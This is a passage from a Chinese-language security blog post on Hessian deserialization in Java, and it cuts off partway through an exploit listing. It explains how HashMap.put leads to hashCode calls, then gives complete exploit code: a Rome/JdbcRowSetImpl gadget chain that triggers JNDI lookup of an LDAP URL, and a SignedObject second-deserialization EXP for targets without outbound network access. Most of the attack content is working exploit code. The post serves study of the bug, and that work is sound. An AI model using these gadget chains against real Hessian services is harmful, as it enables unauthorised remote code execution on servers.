href="#Hessian反序列化漏洞" class="headerlink" title="Hessian反序列化漏洞"></a>Hessian反序列化漏洞</h3><p>虽然<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，但其也有自己的特性，当其反序列化<code>Map</code>类型的对象的时候，会自动调用其<code>put</code>方法，写个demo试试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.put(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        testMap tt=<span class="hljs-keyword">new</span> <span class="hljs-title class_">testMap</span>();<br>        tt.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        ByteArrayOutputStream ser=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(tt);<br>        System.out.println(ser);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hessianInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072235097.png" alt="image-20230126224841023"></p><p>可以看到确实调用了<code>put</code>方法，这时看到<code>HashMap</code>的<code>put</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236935.png" alt="image-20230130233718255"></p><p>对<code>key</code>调用<code>hash</code>方法进行处理</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236365.png" alt="image-20230126225301457"></p><p>只要<code>key</code>不为空，就会调用其<code>hashCode</code>方法，思路一下就打开了，之前看过的利用链中有部分就用到了<code>hashCode</code>方法，比如<code>rome</code>，又比如cc6等。</p><p>就如原生JDK有<code>ysoserial</code>，<code>Hessian</code>也有对应的工具生成<code>paylaod</code>。<a href="https://github.com/mbechler/marshalsec">marshalsec</a>中就集成了<code>Hessian</code>反序列化的<code>gadget</code>，可以使用其生成<code>paylaod</code>，该工具中集成了5个<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><p>由于 Hessian 会加你个序列化的结果处理成一个 Map，所有序列化的结果的 bytes 的第一个 byte 总为 M（77）,会进入这个case</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> readType();<br><br>      <span class="hljs-keyword">return</span> _serializerFactory.readMap(<span class="hljs-built_in">this</span>, type);<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进readMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readMap</span><span class="hljs-params">(AbstractHessianInput in, String type)</span><br>    <span class="hljs-keyword">throws</span> HessianProtocolException, IOException<br>  &#123;<br>    <span class="hljs-type">Deserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> getDeserializer(type);<br></code></pre></td></tr></table></figure><p>跟进getDeserializer，创建一个 HashMap 作为缓存，先将要反序列化的类作为 key 放入 HashMap 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Deserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(String type)</span><br>  <span class="hljs-keyword">throws</span> HessianProtocolException<br>&#123;<br>  <span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_cachedTypeDeserializerMap == <span class="hljs-literal">null</span>)<br>      _cachedTypeDeserializerMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>      _cachedTypeDeserializerMap.put(type, deserializer);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> deserializer;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会调用 HashMap.put 方法，结合之前分析过的 CC 链，后续调用的 hash 函数能触发任意类的 hashcode 方法。那么只需要找一条入口为 hashcode 的反序列化链即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Rome<br>XBean<br>Resin<br>SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br></code></pre></td></tr></table></figure><h2 id="打Rome"><a href="#打Rome" class="headerlink" title="打Rome"></a>打Rome</h2><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> moonflower.hessian;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Rome</span> &#123;<br><span class="hljs-comment">//包装序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br>    <span class="hljs-comment">//包装反序列化的函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><span class="hljs-comment">//反射设置value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><span class="hljs-comment">//反射获取value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:9999/EXP&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(hashMap);<br>        System.out.println(s);<br>        System.out.println((HashMap)deserialize(s));<br>    &#125;<br><br>    <span class="hljs-comment">// 用反射动态创建数组，防止在狗仔 gadget 的时候触发 put 方法导致 RCE。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.until.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Rome的rce过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>  _cachedTypeDeserializerMap.put(type, deserializer);<br>&#125;<br></code></pre></td></tr></table></figure><p>进入触发点，接着调用 EqualBean 的 hashcode 方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236540.png" alt="image-20230124203554850"></p><p>接着会触发 ToStringBean 的 toString 方法（这里就有很多其它延申了，比如可以接一个 CC5）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236941.png" alt="image-20230124203614807"></p><p>接着进入 JdbcRowSetImp 的 toString 方法，在其中会调用 JdbcRowSetImp 的 getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236500.png" alt="image-20230124203639615"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236710.png" alt="image-20230124203654578"></p><p>当调用到 getDatabaseMetaData 的时候，会进入 connect 方法，进而调用 lookup 触发 jndi 注入。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236799.png" alt="image-20230124203716717"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236183.png" alt="image-20230124203736906"></p><h2 id="不出网打法（ROME）"><a href="#不出网打法（ROME）" class="headerlink" title="不出网打法（ROME）"></a>不出网打法（ROME）</h2><p><code>hessian</code>反序列化依赖<code>rome</code>的不出网利用方式</p><h4 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h4><p>在<code>java.security.SignedObject</code>中有一个<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>    b.close();<br>    a.close();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>是一个原生反序列化，那么就可以利用这里实现二次反序列化从而实现RCE。</p></blockquote><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> sun.security.provider.DSAPrivateKey;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">romeExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;<br>        HashMap hashMapx=getObject();<br><br>        <span class="hljs-comment">//构造SignedObject对象</span><br>        SignedObject signedObject=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMapx, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DSAPrivateKey</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>(<span class="hljs-string">&quot;x&quot;</span>) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitVerify</span><span class="hljs-params">(PublicKey publicKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitSign</span><span class="hljs-params">(PrivateKey privateKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span> b)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] engineSign() <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">engineVerify</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] sigBytes)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineSetParameter</span><span class="hljs-params">(String param, Object value)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">engineGetParameter</span><span class="hljs-params">(String param)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br><br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj= EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(hashMap);<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Field field=obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-comment">//获取原生反序列化对象</span><br>    <span class="hljs-keyword">public</span> <span 